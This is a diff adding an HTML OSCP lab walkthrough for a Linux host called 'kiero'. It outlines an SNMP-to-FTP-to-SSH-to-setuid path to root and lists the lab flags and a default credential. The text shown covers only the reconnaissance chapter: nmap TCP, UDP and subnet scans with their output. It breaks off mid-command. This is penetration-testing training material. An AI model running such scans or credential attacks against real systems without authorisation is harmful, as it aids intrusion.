@@ -1,0 +1,2389 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>192.168.245.149 — kiero · OSCP walkthrough</title>
+<meta name="description" content="Interactive step-by-step OSCP lab walkthrough: SNMP extend leak to default FTP credentials to a setuid PATH hijack. Full commands, reasoning and raw output.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="192.168.245.149 — kiero · OSCP walkthrough">
+<meta property="og:description" content="UDP/161 SNMP leak → default FTP credentials → exposed SSH key → setuid PATH hijack → root.">
+<meta name="color-scheme" content="dark light">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💀</text></svg>">
+<style>
+*,*::before,*::after{box-sizing:border-box}
+:root{
+  --bg:#0a0e13; --bg2:#0f151d; --panel:#0d131b; --line:#1c2836; --line2:#263545;
+  --fg:#dde5ee; --dim:#8697ab; --dim2:#5d6d80;
+  --acc:#3fb950; --acc-dim:#1f6f31; --amber:#d29922; --red:#f85149; --link:#58a6ff;
+  --code:#070a0e; --shadow:0 20px 50px rgba(0,0,0,.45);
+  --mono:ui-monospace,SFMono-Regular,"SF Mono",Menlo,Consolas,"Liberation Mono",monospace;
+  --sans:-apple-system,BlinkMacSystemFont,"Segoe UI",Inter,Roboto,Helvetica,Arial,sans-serif;
+}
+[data-theme="light"]{
+  --bg:#f4f6f9; --bg2:#ffffff; --panel:#ffffff; --line:#e3e8ef; --line2:#d3dae4;
+  --fg:#151b23; --dim:#5a6675; --dim2:#7d8898;
+  --acc:#1a7f37; --acc-dim:#8fd19e; --amber:#9a6700; --red:#cf222e; --link:#0969da;
+  --code:#0d1117; --shadow:0 16px 40px rgba(15,25,40,.10);
+}
+html{scroll-behavior:smooth}
+body{
+  margin:0;background:var(--bg);color:var(--fg);font-family:var(--sans);
+  font-size:16px;line-height:1.62;-webkit-font-smoothing:antialiased;
+}
+a{color:var(--link);text-decoration:none}
+a:hover{text-decoration:underline}
+code{font-family:var(--mono);font-size:.88em}
+.skip{position:absolute;left:-9999px;top:0;background:var(--acc);color:#04120a;padding:10px 16px;z-index:99}
+.skip:focus{left:8px;top:8px}
+
+/* ---------- top bar ---------- */
+.topbar{
+  position:sticky;top:0;z-index:40;display:flex;align-items:center;gap:14px;
+  padding:10px 18px;background:color-mix(in srgb,var(--bg) 88%,transparent);
+  backdrop-filter:blur(14px);border-bottom:1px solid var(--line);
+}
+.brand{display:flex;align-items:center;gap:9px;font-weight:700;letter-spacing:.02em;white-space:nowrap}
+.brand .dot{width:9px;height:9px;border-radius:50%;background:var(--acc);box-shadow:0 0 12px var(--acc)}
+.brand .slash{color:var(--dim2);font-weight:400}
+.brand-sub{color:var(--dim);font-weight:500}
+.search-wrap{position:relative;flex:1;max-width:460px;margin-left:auto}
+#search{
+  width:100%;padding:9px 13px;border-radius:10px;border:1px solid var(--line2);
+  background:var(--bg2);color:var(--fg);font-family:var(--sans);font-size:14px;outline:none;
+}
+#search:focus{border-color:var(--acc);box-shadow:0 0 0 3px color-mix(in srgb,var(--acc) 18%,transparent)}
+.search-count{position:absolute;right:10px;top:50%;transform:translateY(-50%);font-size:11px;color:var(--dim2)}
+.icon-btn{
+  background:var(--bg2);border:1px solid var(--line2);color:var(--fg);border-radius:10px;
+  width:38px;height:38px;font-size:16px;cursor:pointer;line-height:1;
+}
+.icon-btn:hover{border-color:var(--acc)}
+.burger{display:none;background:none;border:1px solid var(--line2);color:var(--fg);border-radius:9px;width:38px;height:38px;font-size:17px;cursor:pointer}
+
+/* ---------- shell ---------- */
+.shell{display:grid;grid-template-columns:296px minmax(0,1fr);gap:0;align-items:start}
+.sidebar{
+  position:sticky;top:59px;height:calc(100vh - 59px);overflow-y:auto;padding:20px 16px 60px;
+  border-right:1px solid var(--line);background:var(--bg);
+}
+.sidebar::-webkit-scrollbar{width:9px}
+.sidebar::-webkit-scrollbar-thumb{background:var(--line2);border-radius:9px}
+
+.card{border:1px solid var(--line);border-radius:14px;padding:14px;background:var(--panel);margin-bottom:16px}
+.card h3{margin:0 0 10px;font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:var(--dim)}
+.progress-track{height:6px;border-radius:99px;background:var(--line);overflow:hidden}
+.progress-fill{height:100%;width:0;background:linear-gradient(90deg,var(--acc-dim),var(--acc));transition:width .35s ease}
+.progress-label{margin-top:9px;font-size:12px;color:var(--dim);display:flex;justify-content:space-between}
+.progress-label b{color:var(--fg)}
+
+.nav-title{font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:var(--dim2);margin:4px 8px 8px}
+.nav-item{
+  display:grid;grid-template-columns:26px 1fr 20px;align-items:center;gap:8px;
+  padding:9px 10px;border-radius:10px;color:var(--fg);font-size:14px;
+  border:1px solid transparent;text-decoration:none;
+}
+.nav-item:hover{background:var(--bg2);text-decoration:none}
+.nav-item.active{background:color-mix(in srgb,var(--acc) 12%,transparent);border-color:color-mix(in srgb,var(--acc) 35%,transparent)}
+.nav-item.active .nav-num{color:var(--acc)}
+.nav-item.done .nav-label{color:var(--dim);text-decoration:line-through}
+.nav-num{font-family:var(--mono);font-size:11px;color:var(--dim2)}
+.nav-check{appearance:none;width:16px;height:16px;border:1.5px solid var(--line2);border-radius:5px;cursor:pointer;margin:0;background:transparent}
+.nav-check:checked{background:var(--acc);border-color:var(--acc)}
+.nav-check:checked::after{content:"✓";display:block;color:#04120a;font-size:12px;line-height:13px;text-align:center;font-weight:700}
+.nav-tools{display:flex;gap:8px;margin-top:12px}
+.ghost{
+  flex:1;background:var(--bg2);border:1px solid var(--line2);color:var(--dim);
+  padding:7px 10px;border-radius:9px;font-size:12px;cursor:pointer;font-family:var(--sans);
+}
+.ghost:hover{color:var(--fg);border-color:var(--acc)}
+.meta-line{display:flex;justify-content:space-between;gap:10px;font-size:12px;padding:5px 0;border-bottom:1px dashed var(--line)}
+.meta-line:last-child{border-bottom:0}
+.meta-line span:first-child{color:var(--dim)}
+.meta-line span:last-child{font-family:var(--mono);font-size:11px;text-align:right}
+
+/* ---------- main ---------- */
+main{padding:34px 36px 90px;max-width:1000px;width:100%}
+
+.hero{margin-bottom:38px}
+.eyebrow{font-size:11px;letter-spacing:.18em;text-transform:uppercase;color:var(--acc);margin-bottom:12px}
+.hero h1{margin:0;font-size:clamp(28px,4vw,44px);line-height:1.12;letter-spacing:-.025em;font-family:var(--sans)}
+.hero h1 .ip{font-family:var(--mono);font-weight:600;font-size:.9em;letter-spacing:-.045em}
+.hero h1 .name{color:var(--dim);font-weight:500}
+.lede{color:var(--dim);font-size:17px;max-width:68ch;margin:14px 0 18px}
+.badges{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:22px}
+.badge{
+  font-size:12px;padding:5px 11px;border-radius:99px;border:1px solid var(--line2);
+  color:var(--dim);background:var(--bg2);font-family:var(--mono);
+}
+.badge.ok{color:var(--acc);border-color:color-mix(in srgb,var(--acc) 40%,transparent);background:color-mix(in srgb,var(--acc) 9%,transparent)}
+.badge.warn{color:var(--amber);border-color:color-mix(in srgb,var(--amber) 40%,transparent);background:color-mix(in srgb,var(--amber) 9%,transparent)}
+
+.chain{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:8px;margin:8px 0 6px}
+.step{
+  position:relative;display:flex;flex-direction:column;gap:3px;padding:12px;border-radius:12px;
+  border:1px solid var(--line);background:var(--panel);color:var(--fg);text-decoration:none;
+  transition:transform .15s ease,border-color .15s ease;
+}
+.step:hover{transform:translateY(-2px);border-color:var(--acc);text-decoration:none}
+.step-num{font-family:var(--mono);font-size:10px;color:var(--acc)}
+.step-label{font-weight:650;font-size:14px}
+.step-desc{font-size:11.5px;color:var(--dim);line-height:1.45}
+.step-desc code{font-size:11px;background:var(--code);padding:1px 4px;border-radius:4px;color:#c9d5e4}
+
+.flags{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:12px;margin:26px 0 10px}
+.flag{border:1px solid var(--line);border-radius:14px;padding:16px;background:var(--panel)}
+.flag .k{font-size:11px;letter-spacing:.12em;text-transform:uppercase;color:var(--dim2);margin-bottom:8px}
+.flag .v{font-family:var(--mono);font-size:14px;word-break:break-all;min-height:22px}
+.flag.revealed .v{color:var(--acc)}
+.flag .reveal{margin-top:10px;background:none;border:0;color:var(--link);font-size:12px;cursor:pointer;padding:0}
+.flag .masked{letter-spacing:.18em;color:var(--dim2)}
+
+/* ---------- chapters ---------- */
+.chapter{scroll-margin-top:78px;margin:0 0 34px;border-top:1px solid var(--line);padding-top:26px}
+.ch-head{display:flex;align-items:flex-start;gap:14px;margin-bottom:6px}
+.ch-num{
+  font-family:var(--mono);font-size:12px;color:var(--acc);border:1px solid color-mix(in srgb,var(--acc) 35%,transparent);
+  background:color-mix(in srgb,var(--acc) 9%,transparent);border-radius:9px;padding:6px 9px;flex:none;
+}
+.ch-title{flex:1;min-width:0}
+.ch-title h2{margin:0;font-size:24px;letter-spacing:-.01em}
+.ch-sub{margin:2px 0 0;color:var(--dim);font-size:13.5px}
+.copyall{flex:none;max-width:140px}
+
+.content{font-size:15.3px}
+.content h3{font-size:18px;margin:0;letter-spacing:-.01em}
+.content h4{font-size:14px;margin:22px 0 8px;color:var(--dim);letter-spacing:.04em;text-transform:uppercase}
+.content p{margin:10px 0}
+.content ul,.content ol{padding-left:22px;margin:10px 0}
+.content li{margin:5px 0}
+.content strong{color:#fff}
+[data-theme="light"] .content strong{color:#000}
+.content code{
+  background:color-mix(in srgb,var(--line2) 42%,transparent);border:1px solid var(--line);
+  padding:.1em .36em;border-radius:5px;color:#e8eff8;white-space:nowrap;
+}
+[data-theme="light"] .content code{color:#0d1520;background:#edf1f6}
+.block pre code,.block pre span{background:none;border:0;padding:0}
+.content td code,.content li code{white-space:normal}
+.content hr{border:0;border-top:1px solid var(--line);margin:26px 0}
+.content blockquote{margin:14px 0;padding:10px 14px;border-left:3px solid var(--amber);background:color-mix(in srgb,var(--amber) 7%,transparent);border-radius:0 8px 8px 0;color:var(--dim)}
+.content blockquote p{margin:4px 0}
+
+.sec{border:1px solid var(--line);border-radius:12px;margin:14px 0;background:color-mix(in srgb,var(--panel) 60%,transparent);overflow:hidden}
+.sec-head{
+  width:100%;display:flex;align-items:center;gap:10px;background:none;border:0;color:var(--fg);
+  padding:12px 15px;font-size:17px;font-weight:650;cursor:pointer;text-align:left;font-family:var(--sans);
+}
+.sec-head:hover{background:var(--bg2)}
+.sec-head::before{content:"▸";color:var(--dim2);font-size:12px;transition:transform .18s ease;flex:none}
+.sec-head[aria-expanded="true"]::before{transform:rotate(90deg)}
+.sec-body{padding:2px 15px 14px}
+.sec-body[hidden]{display:none}
+
+/* tables */
+table{border-collapse:collapse;width:100%;margin:14px 0;font-size:13.5px;display:block;overflow-x:auto}
+th,td{border:1px solid var(--line);padding:8px 11px;text-align:left;vertical-align:top}
+th{background:var(--bg2);font-weight:600;font-size:12px;letter-spacing:.04em;text-transform:uppercase;color:var(--dim)}
+tr:nth-child(even) td{background:color-mix(in srgb,var(--bg2) 55%,transparent)}
+
+/* code cards */
+.block{margin:12px 0;border:1px solid var(--line);border-radius:10px;overflow:hidden;background:var(--code)}
+.block-bar{
+  display:flex;align-items:center;justify-content:space-between;padding:6px 10px;
+  background:#0b1017;border-bottom:1px solid #16202c;
+}
+[data-theme="light"] .block-bar{background:#161b22;border-bottom-color:#232c38}
+.block-tag{font-family:var(--mono);font-size:10px;letter-spacing:.14em;text-transform:uppercase;color:#5f7085}
+.block-cmd .block-tag{color:#3fb950}
+.copy{
+  background:#131c26;border:1px solid #24313f;color:#9fb0c3;border-radius:7px;
+  font-size:11px;padding:3px 9px;cursor:pointer;font-family:var(--sans);
+}
+.copy:hover{color:#fff;border-color:#3fb950}
+.copy.done{color:#3fb950;border-color:#3fb950}
+.block pre{margin:0;padding:13px 15px;overflow-x:auto;font-family:var(--mono);font-size:12.9px;line-height:1.6;color:#c9d5e4}
+.block-out{border-style:dashed}
+.block-out pre{color:#93a3b6}
+.codehilite{background:transparent}
+.codehilite pre{margin:0}
+.highlight .c,.highlight .c1,.highlight .cm{color:#5f7085;font-style:italic}
+.highlight .k,.highlight .kn,.highlight .kd{color:#d2a8ff}
+.highlight .s,.highlight .s1,.highlight .s2,.highlight .sb{color:#7ee787}
+.highlight .nb,.highlight .nf{color:#79c0ff}
+.highlight .nv,.highlight .vi{color:#ffa657}
+.highlight .mi,.highlight .m{color:#ffa657}
+.highlight .o,.highlight .p{color:#c9d5e4}
+.highlight .gp{color:#3fb950;font-weight:700}
+
+footer{margin-top:50px;padding-top:22px;border-top:1px solid var(--line);color:var(--dim2);font-size:12.5px;display:flex;flex-wrap:wrap;gap:14px;justify-content:space-between}
+
+/* toast + top button */
+#toast{
+  position:fixed;left:50%;bottom:26px;transform:translate(-50%,20px);opacity:0;pointer-events:none;
+  background:var(--acc);color:#04120a;padding:9px 16px;border-radius:99px;font-size:13px;font-weight:650;
+  transition:opacity .2s ease,transform .2s ease;z-index:60;
+}
+#toast.show{opacity:1;transform:translate(-50%,0)}
+#toTop{
+  position:fixed;right:22px;bottom:22px;width:42px;height:42px;border-radius:50%;
+  background:var(--panel);border:1px solid var(--line2);color:var(--fg);cursor:pointer;
+  opacity:0;pointer-events:none;transition:opacity .2s ease;z-index:50;font-size:16px;
+}
+#toTop.show{opacity:1;pointer-events:auto}
+#toTop:hover{border-color:var(--acc)}
+
+mark.hit{background:color-mix(in srgb,var(--amber) 45%,transparent);color:inherit;border-radius:3px}
+
+@media (max-width:940px){
+  .shell{grid-template-columns:1fr}
+  .sidebar{
+    position:fixed;inset:59px 0 0 0;height:auto;z-index:35;transform:translateX(-102%);
+    transition:transform .22s ease;width:296px;box-shadow:var(--shadow);
+  }
+  .sidebar.open{transform:none}
+  .burger{display:block}
+  main{padding:24px 18px 80px}
+  .search-wrap{max-width:none}
+  .copyall{display:none}
+  .brand-sub,.brand .slash{display:none}
+}
+@media print{
+  .topbar,.sidebar,#toTop,#toast,.copy,.copyall,.block-bar{display:none!important}
+  .shell{display:block}
+  main{padding:0;max-width:none}
+  body{background:#fff;color:#000}
+  .sec{border:0;margin:0}
+  .sec-head{font-size:14px}
+  .sec-body{display:block!important}
+}
+</style>
+</head>
+<body>
+<a class="skip" href="#main">Skip to content</a>
+
+<header class="topbar">
+  <button class="burger" id="burger" type="button" aria-label="Open navigation">☰</button>
+  <div class="brand"><span class="dot"></span>OSCP<span class="slash">/</span><span class="brand-sub">kiero</span></div>
+  <div class="search-wrap">
+    <input id="search" type="search" placeholder="Search chapters…   ( / )" autocomplete="off" aria-label="Search chapters">
+    <span class="search-count" id="searchCount"></span>
+  </div>
+  <button class="icon-btn" id="themeBtn" type="button" aria-label="Toggle colour theme" title="Toggle theme">◐</button>
+</header>
+
+<div class="shell">
+  <aside class="sidebar" id="sidebar">
+    <div class="card">
+      <h3>Progress</h3>
+      <div class="progress-track"><div class="progress-fill" id="bar"></div></div>
+      <div class="progress-label"><span><b id="pcount">0 / 9</b> chapters</span><span id="ppct">0%</span></div>
+    </div>
+
+    <div class="nav-title">Chapters</div>
+    <nav><a class="nav-item" href="#ch-01" data-target="ch-01"><span class="nav-num">01</span><span class="nav-label">Reconnaissance</span><input class="nav-check" type="checkbox" data-ch="ch-01" aria-label="Mark Reconnaissance complete"></a>
+<a class="nav-item" href="#ch-02" data-target="ch-02"><span class="nav-num">02</span><span class="nav-label">Web enumeration</span><input class="nav-check" type="checkbox" data-ch="ch-02" aria-label="Mark Web enumeration complete"></a>
+<a class="nav-item" href="#ch-03" data-target="ch-03"><span class="nav-num">03</span><span class="nav-label">SNMP</span><input class="nav-check" type="checkbox" data-ch="ch-03" aria-label="Mark SNMP complete"></a>
+<a class="nav-item" href="#ch-04" data-target="ch-04"><span class="nav-num">04</span><span class="nav-label">FTP</span><input class="nav-check" type="checkbox" data-ch="ch-04" aria-label="Mark FTP complete"></a>
+<a class="nav-item" href="#ch-05" data-target="ch-05"><span class="nav-num">05</span><span class="nav-label">Foothold</span><input class="nav-check" type="checkbox" data-ch="ch-05" aria-label="Mark Foothold complete"></a>
+<a class="nav-item" href="#ch-06" data-target="ch-06"><span class="nav-num">06</span><span class="nav-label">Privilege escalation</span><input class="nav-check" type="checkbox" data-ch="ch-06" aria-label="Mark Privilege escalation complete"></a>
+<a class="nav-item" href="#ch-07" data-target="ch-07"><span class="nav-num">07</span><span class="nav-label">Flags &amp; cleanup</span><input class="nav-check" type="checkbox" data-ch="ch-07" aria-label="Mark Flags and cleanup complete"></a>
+<a class="nav-item" href="#ch-08" data-target="ch-08"><span class="nav-num">08</span><span class="nav-label">Methodology</span><input class="nav-check" type="checkbox" data-ch="ch-08" aria-label="Mark Methodology complete"></a>
+<a class="nav-item" href="#ch-09" data-target="ch-09"><span class="nav-num">09</span><span class="nav-label">Cheat sheet</span><input class="nav-check" type="checkbox" data-ch="ch-09" aria-label="Mark Cheat sheet complete"></a></nav>
+    <div class="nav-tools">
+      <button class="ghost" id="expandAll" type="button">Expand all</button>
+      <button class="ghost" id="collapseAll" type="button">Collapse all</button>
+    </div>
+    <div class="nav-tools"><button class="ghost" id="resetProgress" type="button">Reset progress</button></div>
+
+    <div class="card" style="margin-top:16px">
+      <h3>Target</h3>
+      <div class="meta-line"><span>Host</span><span>kiero</span></div>
+      <div class="meta-line"><span>IP</span><span>192.168.245.149</span></div>
+      <div class="meta-line"><span>OS</span><span>Ubuntu 20.04.5</span></div>
+      <div class="meta-line"><span>TCP</span><span>21, 22, 80</span></div>
+      <div class="meta-line"><span>UDP</span><span>161</span></div>
+      <div class="meta-line"><span>Result</span><span>root</span></div>
+    </div>
+
+    <div class="card">
+      <h3>Source</h3>
+      <div class="meta-line"><span>Repo</span><span><a href="https://github.com/AV10V/OSCP">AV10V/OSCP</a></span></div>
+      <div class="meta-line"><span>Notes</span><span>markdown</span></div>
+    </div>
+  </aside>
+
+  <main id="main">
+    <section class="hero" id="overview">
+      <div class="eyebrow">OSCP lab walkthrough</div>
+      <h1><span class="ip">192.168.245.149</span> <span class="name">— kiero</span></h1>
+      <p class="lede">
+        A Linux box whose only TCP services were three well-patched daemons — and whose entire
+        entry point was hiding in a UDP port nobody scans. The host names its own weak credential
+        over SNMP, then a setuid helper hands over root.
+      </p>
+      <div class="badges">
+        <span class="badge">Ubuntu 20.04.5</span>
+        <span class="badge">vsftpd 3.0.5</span>
+        <span class="badge">OpenSSH 8.2p1</span>
+        <span class="badge">Apache 2.4.41</span>
+        <span class="badge warn">udp/161 snmpd</span>
+        <span class="badge ok">root · 2 flags</span>
+      </div>
+      <div class="chain"><a class="step" href="#ch-01"><span class="step-num">01</span><span class="step-label">UDP 161</span><span class="step-desc">snmpd · community <code>public</code></span></a>
+<a class="step" href="#ch-03"><span class="step-num">02</span><span class="step-label">Extend leak</span><span class="step-desc"><code>nsExtendTable</code> → username + default password</span></a>
+<a class="step" href="#ch-04"><span class="step-num">03</span><span class="step-label">FTP</span><span class="step-desc"><code>kiero:kiero</code> → <code>id_rsa</code></span></a>
+<a class="step" href="#ch-05"><span class="step-num">04</span><span class="step-label">SSH</span><span class="step-desc">key → shell as <code>john</code></span></a>
+<a class="step" href="#ch-06"><span class="step-num">05</span><span class="step-label">SUID</span><span class="step-desc"><code>RESET_PASSWD</code> calls <code>system()</code></span></a>
+<a class="step" href="#ch-07"><span class="step-num">06</span><span class="step-label">root</span><span class="step-desc"><code>proof.txt</code></span></a></div>
+      <div class="flags">
+        <div class="flag">
+          <div class="k">local.txt · as john</div>
+          <div class="v" data-value="af540ac8ffa61d312756f2f4a3877d1d"><span class="masked">••••••••••••••••••••••••••••••••</span></div>
+          <button class="reveal" type="button">reveal</button>
+        </div>
+        <div class="flag">
+          <div class="k">proof.txt · as root</div>
+          <div class="v" data-value="9e7f4ce50acc525d577abfc26aebfd1e"><span class="masked">••••••••••••••••••••••••••••••••</span></div>
+          <button class="reveal" type="button">reveal</button>
+        </div>
+      </div>
+    </section>
+
+    <section class="chapter" id="ch-01" data-title="Reconnaissance"><div class="ch-head"><span class="ch-num">01</span><div class="ch-title"><h2>Reconnaissance</h2><p class="ch-sub">Port scan and service fingerprint</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>Goal: confirm the host is reachable, enumerate every open TCP port, fingerprint the services,
+and then — because TCP came back sparse — check UDP as well.</p>
+<hr />
+<h3>1.1 Connectivity</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ping<span class="w"> </span>-c<span class="w"> </span><span class="m">2</span><span class="w"> </span>-W<span class="w"> </span><span class="m">2</span><span class="w"> </span><span class="m">192</span>.168.245.149
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">PING 192.168.245.149 (192.168.245.149) 56(84) bytes of data.
+64 bytes from 192.168.245.149: icmp_seq=1 ttl=61 time=64.5 ms
+64 bytes from 192.168.245.149: icmp_seq=2 ttl=61 time=64.3 ms</span></pre></div>
+<p><strong>Reading it:</strong> TTL 61 means the packet started at 64 and crossed three hops, which on this lab
+subnet means a Linux kernel with the default <code>net.ipv4.ip_default_ttl=64</code> sitting behind a couple
+of routers. Already a hint the box is Linux before a single port is touched. The ~64 ms RTT
+confirms it is reachable over the VPN tunnel rather than on-link.</p>
+<hr />
+<h3>1.2 Full TCP port scan</h3>
+<p>Scan all 65535 ports first — never trust a "top 1000" scan on an exam box.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>mkdir<span class="w"> </span>-p<span class="w"> </span>/tmp/box149<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span>/tmp/box149
+nmap<span class="w"> </span>-p-<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">3000</span><span class="w"> </span>-T4<span class="w"> </span>-oN<span class="w"> </span>full_tcp.txt<span class="w"> </span><span class="m">192</span>.168.245.149
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-14 18:07 -0500
+Nmap scan report for 192.168.245.149
+Host is up (0.063s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 23.54 seconds</span></pre></div>
+<p><strong>Reading it:</strong></p>
+<ul>
+<li><code>65532 closed tcp ports (reset)</code> — the host answers with RST rather than dropping, so there is
+  <strong>no packet filter</strong> in front of it. Every port result here is trustworthy.</li>
+<li>Only three services. That is a deliberately small attack surface, which usually means the
+  intended path is a <em>service misconfiguration</em> rather than a memory-corruption exploit.</li>
+<li>23 seconds for a full sweep is the payoff from <code>--min-rate 3000</code> on a LAN-speed target.</li>
+</ul>
+<hr />
+<h3>1.3 Service and version detection</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-p21,22,80<span class="w"> </span>-oN<span class="w"> </span>services.txt<span class="w"> </span><span class="m">192</span>.168.245.149
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.5
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 23:d9:09:5d:d8:89:6d:09:63:e4:b5:5d:b3:ab:45:e6 (RSA)
+|   256 d0:e4:e4:db:0b:75:7e:d6:35:f5:e7:b5:d0:c4:aa:90 (ECDSA)
+|_  256 3b:9e:f9:d2:46:50:ee:f0:80:ed:eb:c0:7f:d0:e7:16 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span></pre></div>
+<p><strong>Reading it, service by service:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Service</th>
+<th>Version</th>
+<th>Assessment at this point</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>FTP</td>
+<td>vsftpd 3.0.5</td>
+<td>Recent (3.0.3 &gt; 2.3.4, so the 2011 backdoor is irrelevant). No known RCE. The realistic weakness is <strong>credentials</strong>, not the daemon.</td>
+</tr>
+<tr>
+<td>SSH</td>
+<td>OpenSSH 8.2p1 Ubuntu 4ubuntu0.13</td>
+<td>Current patched Ubuntu build of 8.2. <code>regreSSHion</code> (CVE-2024-6387) affects 8.5p1–9.7p1, so <strong>not</strong> applicable here. Password auth appears enabled (we test that later).</td>
+</tr>
+<tr>
+<td>HTTP</td>
+<td>Apache 2.4.41 Ubuntu</td>
+<td>Old, but Ubuntu backports fixes. Worth checking CVE-2021-41773/42013 path traversal, which is <em>the</em> classic 2.4.49/2.4.50 bug — note 2.4.41 is outside the officially affected range, but the check costs one request.</td>
+</tr>
+</tbody>
+</table>
+<p>Also note <code>http-title: Apache2 Ubuntu Default Page: It works</code> — the stock page. That suggests no
+application is deployed, at least not at the document root.</p>
+<p>The <code>ssh-hostkey</code> fingerprints are worth recording: if the same host reappears on another IP in
+the lab, the keys prove it is the same machine.</p>
+<hr />
+<h3>1.4 UDP — the step that actually matters</h3>
+<p>A TCP-only scan finds three well-patched services and the box looks like a wall. UDP is where
+OSCP boxes hide their easiest wins, and SNMP is the usual reason.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nmap<span class="w"> </span>-sU<span class="w"> </span>--top-ports<span class="w"> </span><span class="m">30</span><span class="w"> </span>-T4<span class="w"> </span>--max-retries<span class="w"> </span><span class="m">1</span><span class="w"> </span>--host-timeout<span class="w"> </span>180s<span class="w"> </span><span class="m">192</span>.168.245.149
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">53/udp    open|filtered domain
+67/udp    closed        dhcps
+68/udp    open|filtered dhcpc
+69/udp    open|filtered tftp
+111/udp   open|filtered rpcbind
+123/udp   open|filtered ntp
+135/udp   open|filtered msrpc
+137/udp   open|filtered netbios-ns
+138/udp   open|filtered netbios-dgm
+139/udp   open|filtered netbios-ssn
+161/udp   open          snmp
+162/udp   open|filtered snmptrap
+445/udp   closed        microsoft-ds
+500/udp   open|filtered isakmp
+514/udp   closed        syslog
+520/udp   open|filtered route
+631/udp   open|filtered ipp</span></pre></div>
+<p><strong>Reading it:</strong> almost everything is <code>open|filtered</code>, which is UDP's way of saying "no reply
+arrived, and that is not proof of anything". The one word that is not hedged is
+<strong><code>161/udp open snmp</code></strong> — an actual response came back. That is the only solid UDP finding, and it
+is the one that leads to root on this box.</p>
+<blockquote>
+<p><strong>Lesson worth internalising:</strong> on this host, a complete TCP scan plus a version scan produced
+zero exploitable leads. Thirty UDP ports produced the entire entry point. Budget the extra
+2–3 minutes.</p>
+</blockquote>
+<hr />
+<h3>1.5 Neighbourhood check</h3>
+<p>Before committing to a host, confirm what else is on the subnet — sometimes a box is only
+solvable after pivoting from a neighbour, and sometimes a neighbour exposes something this host
+does not.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nmap<span class="w"> </span>-sn<span class="w"> </span><span class="m">192</span>.168.245.0/24<span class="w"> </span>-oG<span class="w"> </span>-<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>up<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $2}&#39;</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">192.168.245.147
+192.168.245.149
+192.168.245.150
+192.168.245.151
+192.168.245.254</span></pre></div>
+<p><code>.254</code> is the gateway. <code>.147</code>, <code>.149</code>, <code>.150</code>, <code>.151</code> are targets. <strong><code>.149</code> has a single network
+interface and a default route via <code>.254</code>, so it is not a pivot host</strong> — the whole box is reachable
+directly from Kali, and nothing has to be tunnelled.</p>
+<p>Quick sanity check on the neighbours for later:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="k">for</span><span class="w"> </span>h<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">192</span>.168.245.147<span class="w"> </span><span class="m">192</span>.168.245.150<span class="w"> </span><span class="m">192</span>.168.245.151<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;=== </span><span class="nv">$h</span><span class="s2"> ===&quot;</span>
+<span class="w">  </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-p21,22,80,135,139,443,445,3389,5985,8080<span class="w"> </span>-T4<span class="w"> </span>--max-retries<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$h</span><span class="w"> </span><span class="se">\</span>
